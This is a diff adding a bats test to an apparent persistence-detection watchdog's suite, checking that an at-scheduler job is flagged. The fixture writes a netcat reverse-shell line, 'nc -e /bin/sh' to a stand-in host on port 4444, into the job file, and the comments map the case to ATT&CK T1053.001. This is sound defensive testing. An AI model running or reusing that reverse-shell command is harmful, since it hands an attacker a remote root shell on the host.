@@ -239,3 +239,20 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd                                              # alert STAYS
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in at job: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
+    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
+    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
+    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks/xsession/
+    # acpi-hooks nc reverse-shell variant INVARIANTs across the
+    # brain. Lock the netcat axis on the at-scheduler one-shot root-
+    # exec persistence surface (T1053.001 — at jobs run AS THE
+    # SUBMITTING USER at the scheduled time; if submitter is root or
+    # the scheduled time arrives during a root-context window, exec
+    # is root).
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${JOB}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
